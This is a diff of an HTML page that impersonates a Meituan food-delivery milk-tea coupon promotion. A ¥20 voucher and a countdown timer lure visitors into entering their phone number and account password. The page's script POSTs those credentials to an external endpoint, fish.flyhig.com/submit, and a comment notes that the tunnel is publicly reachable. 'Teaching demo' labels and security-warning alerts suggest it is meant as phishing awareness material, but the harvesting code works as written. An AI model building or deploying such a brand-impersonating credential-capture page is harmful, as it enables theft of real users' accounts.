@@ -2,16 +2,18 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>美团外卖 · 奶茶节福利</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; }
-        .card { background: white; width: 380px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', sans-serif; }
+        body { background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 15px; }
+        .card { background: white; width: 100%; max-width: 380px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; }
         .header { background: linear-gradient(135deg, #FFC107, #FF9800); padding: 30px 20px; text-align: center; }
         .header h1 { color: white; font-size: 28px; margin-bottom: 8px; }
         .header p { color: rgba(255,255,255,0.9); font-size: 14px; }
         .coupon-box { background: #FFF8E1; margin: 20px; padding: 20px; border-radius: 16px; text-align: center; border: 2px dashed #FF9800; }
         .coupon-value { font-size: 42px; color: #FF5722; font-weight: bold; }
+        .coupon-value span { font-size: 18px; }
         .countdown { background: #FF5722; color: white; padding: 12px; text-align: center; margin: 0 20px 20px; border-radius: 40px; font-weight: bold; }
         .form-group { padding: 0 20px 20px; }
         input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #e0e0e0; border-radius: 12px; font-size: 15px; background: #fafafa; }
@@ -27,7 +29,7 @@
         </div>
         <div class="coupon-box">
             <div class="coupon-value">¥20 <span>元券</span></div>
-            <div style="margin-top:8px; color:#666;">全场奶茶通用 · 满30可用</div>
+            <div style="margin-top: 8px; color: #666;">全场奶茶通用 · 满30可用</div>
         </div>
         <div class="countdown" id="countdown">⏰ 剩余时间：23:59:59</div>
         <div class="form-group">
@@ -39,35 +41,49 @@
     </div>
 
     <script>
-        let time = 24*60*60;
-        setInterval(()=>{
+        let time = 86400;
+        setInterval(function() {
             time--;
-            let h = Math.floor(time/3600).toString().padStart(2,'0');
-            let m = Math.floor((time%3600)/60).toString().padStart(2,'0');
-            let s = (time%60).toString().padStart(2,'0');
-            document.getElementById("countdown").innerHTML=`⏰ 剩余时间：${h}:${m}:${s}`;
-        },1000);
-
-        async function sendData(){
-            let phone = document.getElementById("phone").value;
-            let password = document.getElementById("password").value;
-            if(!phone||!password){alert("请填写完整信息");return;}
-
-            try{
-                let res = await fetch("https://fish.flyhig.com/submit",{
-                    method:"POST",
-                    headers:{"Content-Type":"application/json"},
-                    body:JSON.stringify({phone,password})
-                });
-                await res.json();
-                alert("✅ 领取成功！\n数据已发送至服务器");
-                alert("⚠️ 安全提醒：切勿在陌生页面输入账号密码！");
-            }catch(e){
-                alert("请先启动Python后端！");
-            }
+            let hours = Math.floor(time / 3600);
+            let minutes = Math.floor((time % 3600) / 60);
+            let seconds = time % 60;
+            document.getElementById('countdown').innerHTML = 
+                '⏰ 剩余时间：' + hours.toString().padStart(2,'0') + ':' +
+                minutes.toString().padStart(2,'0') + ':' +
+                seconds.toString().padStart(2,'0');
+        }, 1000);
+        
+        function sendData() {
+            let phone = document.getElementById('phone').value;
+            let password = document.getElementById('password').value;
             
-            document.getElementById("phone").value="";
-            document.getElementById("password").value="";
+            if (!phone || !password) {
+                alert('请填写手机号和密码');
+                return;
+            }
+
+            // 公网穿透地址，任何人都能访问
+            const API_URL = 'https://fish.flyhig.com/submit';
+
+            fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, password: password })
+            })
+            .then(res => {
+                if (!res.ok) throw new Error('请求失败');
+                return res.json();
+            })
+            .then(data => {
+                alert("✅ 领取成功！\n[教学演示] 数据已发送到服务器");
+                alert("⚠️ 安全提醒：不要在陌生页面输入账号密码！");
+            })
+            .catch(err => {
+                alert("请先启动Python后端！");
+            });
+
+            document.getElementById('phone').value = '';
+            document.getElementById('password').value = '';
         }
     </script>
 </body>
